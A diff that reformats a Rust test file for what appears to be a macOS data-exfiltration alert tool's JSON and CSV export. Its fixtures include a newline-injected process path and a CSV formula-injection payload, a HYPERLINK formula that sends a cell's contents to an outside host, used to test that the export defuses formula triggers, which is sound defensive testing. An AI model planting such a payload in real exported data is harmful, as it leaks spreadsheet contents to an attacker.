@@ -12,8 +12,14 @@ fn alerts() -> Vec<Alert> {
             id: 1,
             at: "2026-09-05T15:44:45.179509Z".parse().unwrap(),
             pid: 39416,
-            identity: ProcessIdentity::Signed { team_id: "apple".into(), signing_id: "com.apple.curl".into() },
-            files: vec!["/Users/me/Steuern/a, \"b\".pdf".into(), "/Users/me/Steuern/c.txt".into()],
+            identity: ProcessIdentity::Signed {
+                team_id: "apple".into(),
+                signing_id: "com.apple.curl".into(),
+            },
+            files: vec![
+                "/Users/me/Steuern/a, \"b\".pdf".into(),
+                "/Users/me/Steuern/c.txt".into(),
+            ],
             remote: Some("100.59.99.192".parse().unwrap()),
             remote_port: Some(443),
             bytes_out: 201438,
@@ -30,7 +36,9 @@ fn alerts() -> Vec<Alert> {
             id: 2,
             at: "2026-09-05T15:44:45Z".parse().unwrap(),
             pid: 1,
-            identity: ProcessIdentity::Unknown { path: "/tmp/evil\nx".into() },
+            identity: ProcessIdentity::Unknown {
+                path: "/tmp/evil\nx".into(),
+            },
             files: vec![],
             remote: None,
             remote_port: None,
@@ -73,7 +81,10 @@ fn json_is_pretty_array_in_wire_format() {
     let out = export::json(&alerts()).unwrap();
     let back: Vec<serde_json::Value> = serde_json::from_str(&out).unwrap();
     assert_eq!(back.len(), 2);
-    assert_eq!(back[0]["identity"]["Signed"]["signing_id"], "com.apple.curl");
+    assert_eq!(
+        back[0]["identity"]["Signed"]["signing_id"],
+        "com.apple.curl"
+    );
     assert_eq!(back[1]["remote"], serde_json::Value::Null);
     assert!(out.contains('\n'), "lesbar formatiert");
 }
@@ -85,7 +96,9 @@ fn json_is_pretty_array_in_wire_format() {
 #[test]
 fn csv_defuses_formula_triggers() {
     let mut a = alerts().remove(0);
-    a.identity = ProcessIdentity::Unknown { path: "/tmp/@SUM(A1)".into() };
+    a.identity = ProcessIdentity::Unknown {
+        path: "/tmp/@SUM(A1)".into(),
+    };
     a.files = vec![r#"=HYPERLINK("http://x/?d="&A1,"click")"#.into()];
     a.via = Some("a;b".into());
     let out = export::csv(&[a]);
@@ -115,6 +128,9 @@ fn csv_defuses_formula_triggers() {
         let mut a = alerts().remove(0);
         a.reason = Some(reason.into());
         let out = export::csv(&[a]);
-        assert!(out.ends_with(&format!(",new,{cell}\n")), "{reason:?} -> {out:?}");
+        assert!(
+            out.ends_with(&format!(",new,{cell}\n")),
+            "{reason:?} -> {out:?}"
+        );
     }
 }
